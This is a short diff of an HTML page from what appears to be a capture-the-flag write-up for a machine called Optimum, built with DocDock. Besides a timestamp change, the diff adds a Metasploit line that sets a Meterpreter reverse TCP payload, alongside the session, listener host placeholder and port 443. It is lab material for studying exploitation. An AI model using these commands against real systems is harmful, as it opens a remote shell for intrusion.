@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2019-03-14T00:00:26 EDT">
+<meta name="revised" content="2019-03-14T01:08:35 EDT">
 <title>Optimum :: DocDock Documentation</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -766,6 +766,7 @@ Exploit target:
 <p>need to set the lhost, lport,  &amp; session.</p>
 
 <pre><code>set session 2
+set payload windows/x64/meterpreter/reverse_tcp
 set lhost ippaddr
 set lport 443
 run
